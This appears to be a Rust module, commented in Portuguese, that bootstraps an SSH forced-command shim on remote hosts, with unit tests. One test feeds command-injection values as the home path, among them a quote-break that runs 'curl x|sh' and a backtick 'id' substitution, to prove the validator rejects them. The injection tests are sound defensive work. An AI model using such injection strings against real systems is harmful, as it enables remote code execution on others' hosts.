//! BOOTSTRAP — instala no host a MELHOR fronteira que ele aguentar, e diz honestamente qual
//! foi.
//! O quê: sonda ([`super::capacidade::sondar`]), escolhe o nível, empurra o shim + o catálogo,
//! e escreve a linha `restrict,command=` no `authorized_keys` — sem nunca tocar linha alheia.
//! Onde: `schematize vps bootstrap <alias>` e o botão equivalente da GUI.
//!
//! ## O princípio: adaptar, nunca exigir
//!
//! Não existe pergunta "seu host tem root?". O app **descobre** e faz o melhor possível:
//!
//! ```text
//! sudo sem senha  -> shim do sistema, dono root      (Fronteira::OpsShellRoot)
//! só o home       -> shim no ~/.schematize/          (Fronteira::OpsShellUsuario)
//! nem o home      -> não instala, EXPLICA o porquê   (Fronteira::Sem)
//! ```
//!
//! Os três desfechos são resultado legítimo. O terceiro não é falha do usuário nem do app —
//! é um host gerenciado, e a resposta certa é dizer isso com clareza e seguir funcionando com
//! a política do cliente (§37.48: o software se adapta e nunca culpa).
//!
//! ## Idempotente e não-destrutivo
//! Rodar duas vezes dá no mesmo. E o `authorized_keys` só **ganha** linha: a chave humana de
//! break-glass (piso 13) não pode ser removida por um bootstrap — nem por engano, nem por
//! "limpeza".

use super::capacidade::{Fronteira, Sondagem};
use super::registro::VpsProfile;
use super::verbos::Verbo;

/// O shim, embutido no binário. Vai pro host por stdin, nunca por download — o host pode não
/// ter rede de saída, e baixar script pra executar é o anti-padrão que a denylist proíbe.
pub const SHIM: &str = include_str!("../../packaging/ops-shell/schematize-ops-shell");

/// Caminho do shim no host, por nível.
pub fn caminho_do_shim(f: Fronteira) -> &'static str {
    match f {
        Fronteira::OpsShellRoot => "/usr/local/lib/schematize/ops-shell",
        _ => "$HOME/.schematize/ops-shell",
    }
}

/// O que o bootstrap fez (ou não fez, e por quê).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Relatorio {
    /// Onde o host estava antes.
    pub antes: Fronteira,
    /// Onde ficou depois.
    pub depois: Fronteira,
    /// Quantos verbos foram sincronizados.
    pub verbos: usize,
    /// O que aconteceu, em linguagem de gente.
    pub notas: Vec<String>,
}

impl Relatorio {
    /// A fronteira subiu de nível?
    pub fn melhorou(&self) -> bool {
        self.depois > self.antes
    }
}

/// Monta o script de instalação. **Função pura** — é o que permite testar exatamente o que
/// vai rodar no host sem precisar de host.
///
/// O shim e o catálogo entram por *here-document* com delimitador entre aspas (`<<'EOF'`),
/// que o `sh` NÃO expande: nada de `$` ou crase do conteúdo virar execução no meio do caminho.
///
/// **Onde:** [`instalar`] e os testes.
pub fn script_de_instalacao(
    nivel: Fronteira,
    catalogo: &[Verbo],
    chave_pub: &str,
    home: &str,
) -> Result<String, String> {
    // A validação mora AQUI, no ponto de USO, e não no chamador.
    //
    // A primeira versão validava em `instalar`, antes de chamar esta função. Funcionava — e o
    // teste unitário do validador passava **mesmo com a linha do chamador apagada**: a defesa
    // existia e nada provava que estava LIGADA. É a mesma forma que este repo já corrigiu
    // antes (defesa duplicada em que não se sabe qual das duas atua).
    //
    // Com a checagem aqui, esquecê-la deixou de ser possível — quem quer o script passa por
    // ela — e os testes desta função a exercitam de graça.
    super::registro::valid_home_remoto(home)?;
    // Caminhos LITERAIS: nada de `$HOME` na linha do authorized_keys (ver `Sondagem::home`).
    let dir_usuario = format!("{}/.schematize", home.trim_end_matches('/'));
    let (dir, sudo) = match nivel {
        Fronteira::OpsShellRoot => ("/usr/local/lib/schematize".to_string(), "sudo -n "),
        _ => (dir_usuario, ""),
    };
    let shim_path = format!("{dir}/ops-shell");
    let catalogo_txt = super::verbos::catalogo_texto(catalogo);
    // A linha do authorized_keys. `restrict` liga todas as restrições de uma vez (sem
    // port-forward, sem agent-forward, sem X11, sem pty) — e é aditivo em versões futuras do
    // OpenSSH, ao contrário de listar `no-port-forwarding,no-agent-forwarding,…` à mão.
    Ok(format!(
        r#"set -eu
{sudo}mkdir -p '{dir}'
{sudo}sh -c 'cat > "{dir}/ops-shell"' <<'__SCHEMATIZE_SHIM__'
{shim}
__SCHEMATIZE_SHIM__
{sudo}chmod 0755 '{dir}/ops-shell'
{sudo}sh -c 'cat > "{dir}/catalogo"' <<'__SCHEMATIZE_CAT__'
{catalogo_txt}__SCHEMATIZE_CAT__
{sudo}chmod 0644 '{dir}/catalogo'
mkdir -p "$HOME/.ssh"; chmod 700 "$HOME/.ssh"
AK="$HOME/.ssh/authorized_keys"; touch "$AK"; chmod 600 "$AK"

# TRAVA antes de mexer no authorized_keys.
#
# Sem ela, dois bootstraps simultâneos faziam read-modify-write um por cima do outro: no teste
# destrutivo, seis execuções paralelas deixaram SEIS linhas idênticas do agente. E o temporário
# tinha nome fixo, então um processo truncava o arquivo que o outro estava montando — com
# escalonamento diferente, isso perde a chave humana de break-glass.
#
# `mkdir` é atômico em POSIX e não precisa de `flock` (que falta em BusyBox/BSD).
TRAVA="$HOME/.ssh/.schematize-bootstrap.lock"
i=0
while ! mkdir "$TRAVA" 2>/dev/null; do
    i=$((i+1))
    [ $i -gt 60 ] && {{ echo "schematize: outra instalacao esta em curso (trava em $TRAVA)" >&2; exit 75; }}
    sleep 1
done
trap 'rmdir "$TRAVA" 2>/dev/null' EXIT INT TERM

# Remove SÓ a linha desta mesma chave pública apontando pro ops-shell (re-bootstrap), e
# NENHUMA outra: a chave humana de break-glass tem que sobreviver a isto.
PUB='{chave_pub}'
TMP="$AK.schematize.$$"
grep -v -F "$PUB" "$AK" > "$TMP" 2>/dev/null || true
printf 'restrict,command="%s" %s\n' '{shim_path}' "$PUB" >> "$TMP"
chmod 600 "$TMP"
mv "$TMP" "$AK"
echo "SCHEMATIZE_BOOTSTRAP_OK"
"#,
        shim = SHIM.trim_end(),
    ))
}

/// Decide o nível a instalar a partir da sondagem, e explica a decisão.
///
/// **Função pura**, separada de [`instalar`] justamente para que a REGRA seja testável sem
/// host — é ela que carrega a resposta "às vezes sim, às vezes não".
///
/// **Onde:** [`instalar`] e os testes.
pub fn decidir(s: &Sondagem) -> (Fronteira, Vec<String>) {
    let mut notas = s.notas.clone();
    match s.possivel {
        Fronteira::OpsShellRoot => {
            notas.push("sudo sem senha disponível: o shim vai pro sistema, com dono root.".into());
        }
        Fronteira::OpsShellUsuario => {
            notas.push(
                "sem sudo: o shim vai pro home do usuário. O sshd continua recusando tudo fora do catálogo — o agente não ganha shell.".into(),
            );
        }
        Fronteira::Sem => {
            notas.push(
                "nada a instalar: sem escrita no ~/.ssh/authorized_keys não há forced command, e sem forced command não há fronteira. O host segue utilizável com a política do cliente — que pega acidente, não intenção.".into(),
            );
        }
    }
    if s.instalada == s.possivel && s.instalada != Fronteira::Sem {
        notas.push(
            "já estava no melhor nível possível — o bootstrap só re-sincroniza o catálogo.".into(),
        );
    }
    (s.possivel, notas)
}

/// Instala/atualiza a fronteira no host, no melhor nível possível. Idempotente.
///
/// **Onde:** `vps bootstrap`. **Efeitos:** escreve no host (shim, catálogo, `authorized_keys`)
/// e atualiza `fronteira`/`sondado_em` no registro local.
pub fn instalar(conn: &rusqlite::Connection, p: &mut VpsProfile) -> Result<Relatorio, String> {
    let sond = super::capacidade::sondar(conn, p)?;
    let (nivel, mut notas) = decidir(&sond);
    let catalogo = super::verbos::listar(conn, &p.alias)?;

    // Registra o que se descobriu, mesmo que nada seja instalado: a sondagem é informação.
    p.fronteira = sond.instalada;
    p.sondado_em = super::db::agora_secs();
    super::registro::salvar(conn, p)?;

    if nivel == Fronteira::Sem {
        return Ok(Relatorio { antes: sond.instalada, depois: Fronteira::Sem, verbos: 0, notas });
    }
    if catalogo.is_empty() {
        return Err(format!(
            "o catálogo de {:?} está vazio — instalar o shim sem verbo nenhum trancaria o host para o agente sem dar nada em troca. Crie os verbos com `schematize vps verbs {} --seed` (catálogo inicial) ou `--add <verbo> --cmd '<comando>'`",
            p.alias, p.alias
        ));
    }

    let pub_key = crate::sshkeys::export_public(&p.key_name)?;
    // O `home` veio da SONDAGEM, isto é, do próprio host. Quem o valida é a própria
    // `script_de_instalacao`, no ponto de uso — pra não dar pra esquecer.
    let script = script_de_instalacao(nivel, &catalogo, pub_key.trim(), &sond.home)?;
    let out = super::exec::executar_interno(conn, p, &script, "bootstrap")?;
    if !out.stdout.contains("SCHEMATIZE_BOOTSTRAP_OK") {
        return Err(format!(
            "a instalação não confirmou no host. Saída:\n{}\n{}",
            out.stdout.trim(),
            out.stderr.trim()
        ));
    }

    // Confere pelo host, não pela nossa expectativa: re-sonda e grava o que ele DIZ ter.
    let depois = super::capacidade::sondar(conn, p)?;
    p.fronteira = depois.instalada;
    p.sondado_em = super::db::agora_secs();
    super::registro::salvar(conn, p)?;
    if depois.instalada != nivel {
        notas.push(format!(
            "atenção: pedi o nível {:?} mas o host confirmou {:?} — verifique com `schematize vps probe {}`",
            nivel, depois.instalada, p.alias
        ));
    }
    Ok(Relatorio { antes: sond.instalada, depois: depois.instalada, verbos: catalogo.len(), notas })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::vps::capacidade::interpretar_sondagem;

    fn sond(sudo: &str, ak: &str, shim: &str, forced: &str) -> Sondagem {
        interpretar_sondagem(&format!(
            "sudo={sudo}\nauthkeys={ak}\nshim={shim}\nforced={forced}\nshell=sim\nhome=/home/d\n"
        ))
    }

    fn cat() -> Vec<Verbo> {
        vec![Verbo { nome: "deploy".into(), comando: "/srv/deploy.sh".into() }]
    }

    /// O `$HOME` vem do HOST — é o único valor de fora que vira caminho neste script, e o
    /// script é interpretado por um `sh` do outro lado. A checagem mora no ponto de uso, não
    /// no chamador, justamente pra que este teste a exercite sem precisar de rede.
    #[test]
    fn home_hostil_nao_vira_script() {
        for veneno in ["/home/d'; curl x|sh; echo '", "/home/d`id`", "/home/../etc", "rel/ativo"] {
            let r = script_de_instalacao(Fronteira::OpsShellUsuario, &cat(), "k", veneno);
            assert!(r.is_err(), "$HOME hostil virou script: {veneno:?}");
        }
        // E o legítimo segue produzindo script.
        assert!(script_de_instalacao(Fronteira::OpsShellUsuario, &cat(), "k", "/home/d").is_ok());
    }

    #[test]
    fn com_sudo_instala_no_sistema_com_dono_root() {
        let (nivel, notas) = decidir(&sond("sim", "sim", "nenhum", "nao"));
        assert_eq!(nivel, Fronteira::OpsShellRoot);
        assert!(notas.iter().any(|n| n.contains("dono root")));
        let s = script_de_instalacao(nivel, &cat(), "ssh-ed25519 AAAA x@y", "/home/d")
            .expect("$HOME de teste é válido");
        assert!(s.contains("sudo -n mkdir -p '/usr/local/lib/schematize'"));
    }

    #[test]
    fn sem_sudo_instala_no_home_e_ainda_e_fronteira() {
        // O caso "às vezes não": nem por isso o host fica sem proteção.
        let (nivel, notas) = decidir(&sond("nao", "sim", "nenhum", "nao"));
        assert_eq!(nivel, Fronteira::OpsShellUsuario);
        assert!(nivel.e_server_side(), "o sshd continua sendo quem recusa");
        assert!(notas.iter().any(|n| n.contains("não ganha shell")));
        let s = script_de_instalacao(nivel, &cat(), "ssh-ed25519 AAAA x@y", "/home/deploy")
            .expect("$HOME de teste é válido");
        // As LINHAS DE COMANDO não podem ter sudo (o texto do shim embutido menciona a
        // palavra nos comentários dele — por isso a checagem é por linha, não por substring).
        let comandos: Vec<&str> = s.lines().filter(|l| !l.trim_start().starts_with('#')).collect();
        assert!(
            !comandos.iter().any(|l| l.contains("sudo -n ")),
            "sem sudo nas linhas de comando: {comandos:?}"
        );
        assert!(s.contains("/home/deploy/.schematize/ops-shell"), "caminho LITERAL, não $HOME");
        assert!(!s.contains("command=\"$HOME"), "o command= não pode depender de expansão");
    }

    #[test]
    fn host_gerenciado_nao_instala_e_explica() {
        let (nivel, notas) = decidir(&sond("sim", "nao", "nenhum", "nao"));
        assert_eq!(nivel, Fronteira::Sem);
        let explicou = notas.iter().any(|n| n.contains("sem forced command não há fronteira"));
        assert!(explicou, "tem que explicar o porquê, não só falhar: {notas:?}");
        // E sem culpar ninguém.
        for n in &notas {
            assert!(!n.to_lowercase().contains("você precisa ter root"), "sem culpa: {n}");
        }
    }

    #[test]
    fn o_script_preserva_o_break_glass() {
        // R2 do plano: a chave humana não pode sumir num bootstrap.
        let s = script_de_instalacao(
            Fronteira::OpsShellUsuario,
            &cat(),
            "ssh-ed25519 NOSSA x@y",
            "/home/d",
        )
        .expect("$HOME de teste é válido");
        assert!(s.contains("grep -v -F \"$PUB\""), "remove só a linha da PRÓPRIA chave");
        assert!(!s.contains("> \"$AK\"\n"), "nunca trunca o authorized_keys inteiro");
        assert!(s.contains(">> \"$TMP\""), "acrescenta num temporário, não sobrescreve");
        assert!(s.contains("mkdir \"$TRAVA\""), "trava atômica antes do read-modify-write");
    }

    #[test]
    fn o_script_usa_heredoc_nao_expansivo() {
        // Sem as aspas no delimitador, um `$(...)` dentro do shim ou do catálogo executaria
        // no host durante a instalação.
        let s = script_de_instalacao(Fronteira::OpsShellUsuario, &cat(), "k", "/home/d")
            .expect("$HOME de teste é válido");
        assert!(s.contains("<<'__SCHEMATIZE_SHIM__'"), "delimitador tem que estar entre aspas");
        assert!(s.contains("<<'__SCHEMATIZE_CAT__'"));
    }

    #[test]
    fn o_script_grava_restrict_e_o_caminho_do_shim() {
        let s = script_de_instalacao(
            Fronteira::OpsShellRoot,
            &cat(),
            "ssh-ed25519 AAAA x@y",
            "/home/d",
        )
        .expect("$HOME de teste é válido");
        assert!(s.contains("restrict,command="));
        assert!(s.contains("/usr/local/lib/schematize/ops-shell"));
        assert!(s.contains("SCHEMATIZE_BOOTSTRAP_OK"), "precisa confirmar que terminou");
    }

    #[test]
    fn o_catalogo_vai_inteiro_no_script() {
        let verbos = vec![
            Verbo { nome: "deploy".into(), comando: "/srv/d.sh".into() },
            Verbo { nome: "status".into(), comando: "systemctl status app".into() },
        ];
        let s = script_de_instalacao(Fronteira::OpsShellUsuario, &verbos, "k", "/home/d")
            .expect("$HOME de teste é válido");
        for v in &verbos {
            assert!(s.contains(&format!("{}\t{}", v.nome, v.comando)), "verbo {:?} sumiu", v.nome);
        }
    }

    #[test]
    fn o_shim_embutido_e_o_arquivo_de_verdade() {
        assert!(SHIM.starts_with("#!/bin/sh"), "o shim tem que ser o script real");
        assert!(SHIM.contains("SSH_ORIGINAL_COMMAND"));
        // O valor inteiro do shim é não ter exceção — se alguém acrescentar uma, isto cai.
        for escape in ["--force", "skip_catalog", "if [ \"$USER\" =", "bypass"] {
            assert!(!SHIM.contains(escape), "o shim não pode ter escape: {escape:?}");
        }
    }

    #[test]
    fn relatorio_sabe_dizer_se_melhorou() {
        let r = Relatorio {
            antes: Fronteira::Sem,
            depois: Fronteira::OpsShellUsuario,
            verbos: 1,
            notas: vec![],
        };
        assert!(r.melhorou());
        let r = Relatorio {
            antes: Fronteira::OpsShellRoot,
            depois: Fronteira::OpsShellRoot,
            verbos: 1,
            notas: vec![],
        };
        assert!(!r.melhorou());
    }
}
